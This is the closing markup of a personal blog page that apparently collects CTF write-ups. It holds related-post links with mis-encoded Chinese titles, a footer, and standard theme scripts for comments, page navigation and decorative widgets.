2020-10-06</div><div class="title">ÊîªÈò≤‰∏ñÁïåWebÂå∫~ÊåÅÁª≠Êõ¥Êñ∞‰∏≠ÔºÅ</div></div></a></div><div><a href="/posts/55334/" title="bugkuÂπ≥Âè∞webÈ¢òÁõÆÔºàÊñ∞ÊâãÊé®ËçêÔºâ"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/bugku/%5D%28MZVF%7D3%40%25HTMN%29VS%60KMD74.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-17</div><div class="title">bugkuÂπ≥Âè∞webÈ¢òÁõÆÔºàÊñ∞ÊâãÊé®ËçêÔºâ</div></div></a></div><div><a href="/posts/49040/" title="Êñ∞ÁâàbugkuÂπ≥Âè∞Writeup~ÊåÅÁª≠Êõ¥Êñ∞‰∏≠"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/9YT534K~N47CEGE%5BCM9A%25C6.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-30</div><div class="title">Êñ∞ÁâàbugkuÂπ≥Âè∞Writeup~ÊåÅÁª≠Êõ¥Êñ∞‰∏≠</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>ËØÑËÆ∫</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By dota_st</div><div class="framework-info"><span>dota_st</span> <span class="footer-separator">|</span><span>ÂçöÂÆ¢</span></div><div class="icp"><a target="_blank" rel="noopener external nofollow noreferrer" href="http://beian.miit.gov.cn"><img class="icp-icon" src="/img/icp.png"><span>ÁêºICPÂ§á2020003865Âè∑</span></a></div><html></html><body><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,10,4,9,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="Â∞èÁ†¥Á´ôÂ∑≤Âú®ÂêÑÁßçÁÅæÈöæ‰∏≠ËãüÊ¥ª"+T+" Â§© "+f+" Â∞èÊó∂ "+h+" ÂàÜÈíü "+u+" Áßí"}siteTime()</script></body></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="ÈòÖËØªÊ®°Âºè"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="ÊµÖËâ≤ÂíåÊ∑±Ëâ≤Ê®°ÂºèËΩ¨Êç¢"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="ËÆæÁΩÆ"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="Áõ¥ËææËØÑËÆ∫"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="ÁõÆÂΩï"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="ÂõûÂà∞È°∂ÈÉ®"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Êú¨Âú∞ÊêúÁ¥¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="ÊêúÁ¥¢ÊñáÁ´†" type="text"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Áî±</span> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/wzpan/hexo-generator-search" style="color:#49b1f5">hexo-generator-search</a> <span>Êèê‰æõÊîØÊåÅ</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const initData = {
      el: '#vcomment',
      appId: 'UUju4xdzD3vbcfVWDxse7HuR-gzGzoHsz',
      appKey: 'CndJYK78YWz9SQN7rDMKmM1q',
      placeholder: 'o(*‚â•‚ñΩ‚â§)„ÉÑ‚îè‚îÅ‚îì\nÊòµÁß∞Áõ¥Êé•ËæìÂÖ•QQÂè∑\nÊàëÂ∞±ËÉΩËé∑Âèñ‰Ω†ÁöÑqqÂêçÂ≠óÂíåÂ§¥ÂÉèÂó∑ÔºÅ',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }

    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/gh/dota-st/blog_file@2.03/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@2.03/background.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config_change',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()
  window.foot_tm()
  
  $('script[data-pjax]').each(function () {
    $(this).parent().append($(this).remove())
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  if (typeof gtag === 'function') {
    gtag('config', '', {'page_path': window.location.pathname});
  }

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})


document.addEventListener('pjax:send', function () {
  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  $(window).off('scroll')

  //reset readmode
  $('body').hasClass('read-mode') && $('body').removeClass('read-mode')

})</script></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/haruto.model.json"},display:{superSample:2,position:"right",width:150,height:300,hOffset:20,vOffset:-90},mobile:{show:!0,scale:1},react:{opacityDefault:.3,opacityOnHover:.3,opacity:.95},log:!1})</script></body></html>